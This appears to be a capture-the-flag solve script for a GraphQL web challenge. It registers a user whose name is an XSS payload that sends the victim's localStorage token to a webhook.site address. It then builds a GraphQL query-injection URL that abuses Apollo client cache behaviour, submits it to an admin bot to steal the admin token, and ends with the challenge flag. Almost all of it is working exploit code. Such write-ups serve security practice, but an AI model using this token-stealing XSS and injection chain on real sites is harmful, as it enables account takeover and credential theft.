import requests
import json
import os
from urllib.parse import quote

# host = "http://localhost:7008"
host = "http://c3365128-2e0e-4a33-bcd3-f7ffc8f33790.subs.putlocker.chal.pwni.ng:20002"
payload = (
    "<img src=x: onerror='location=`https://webhook.site/ed852d2a-b167-49da-9159-d48909b980bd?token=`+encodeURIComponent(localStorage.token)'>"
    + os.urandom(8).hex()
)


def graphql(query, variables={}, token=""):
    r = requests.post(
        host + "/graphql",
        json={"query": query, "variables": variables},
        headers={
            "Authorization": token,
        },
    )
    return r.json()


random_episode_id = graphql(
    """
query {
    recentEpisodes {
        id
    }
}
"""
)["data"]["recentEpisodes"][0]["id"]

token = graphql(
    """
mutation($payload: String!) {
    register(name: $payload, password: $payload)
}
""",
    {"payload": payload},
)["data"]["register"]
playlist_id = graphql(
    """
mutation($name: String!, $description: String!) {
    createPlaylist(name: $name, description: $description) {
        id
    }
}
""",
    {"name": "peko", "description": "miko"},
    token=token,
)["data"]["createPlaylist"]["id"]
print(
    graphql(
        """
mutation($playlist_id: ID!, $episode_id: ID!) {
    updatePlaylistEpisodes(id: $playlist_id, episodes: [$episode_id]) {
        id
    }
}
""",
        {"playlist_id": playlist_id, "episode_id": random_episode_id},
        token=token,
    )
)
print(payload)

# location='/playlist/peko?id[kind]=Name&id[value]='+encodeURIComponent(`"b4429f09-0f36-4e67-aa94-492a4d00b885") {
#         id
#         name
#         description: rawDescription
#         episodes {
#             id
#             name
#         }
#         owner {
#             id
#             name
#         }
#     }
#     pl2: playlist(id: "1b6ca857-9560-4f9b-93fd-e12f5f68dd0c") {
#         id
#         name
#         description: owner {
#           __html: name
#         }
#         url: name
#         rating: name
#         ratingCount: name
#         show: owner {
#             owner: shows {
#                 id
#             }
#         }
#     }
#     pl2: episode(id:"5aac1f62-6a23-4054-bd73-60d48396a13d") @client
#     dummy: playlist(id: "00000000-0000-0000-0000-000000000000"`)

url = (
    host
    + "/playlist/peko?id[kind]=Name&id[value]="
    + quote(
        """"%s") { 
        id
        name
        description: rawDescription
        episodes {
            id
            name
        }
        owner {
            id
            name
        }
    }
    pl2: playlist(id: "%s") {
        id
        name
        description: owner {
          __html: name
        }
        url: name
        rating: name
        ratingCount: name
        show: owner {
            owner: shows {
                id
            }
        }
    }
    pl2: episode(id:"%s") @client
    dummy: playlist(id: "00000000-0000-0000-0000-000000000000"
"""
        % (playlist_id, playlist_id, random_episode_id)
    )
)
# apollo client quriks caused this:
# cache.data.data.ROOT_QUERY['episode({"id":"..."})'] = {"id": "...", "name": "...", "description": {"__html": "..."}, ...}
print(url)

print(
    graphql(
        """
mutation($url: String!) {
    report(url: $url)
}
""",
        {"url": url},
        token=token,
    )
)

# grab admin token and `mutation { flag }`
# PCTF{say_what_you_will_about_these_sites_but_they_wont_pull_a_warner_bros_discovery_on_you_and_yeet_37_shows_into_the_void_f0e0079af5e5b05edbf5d248}
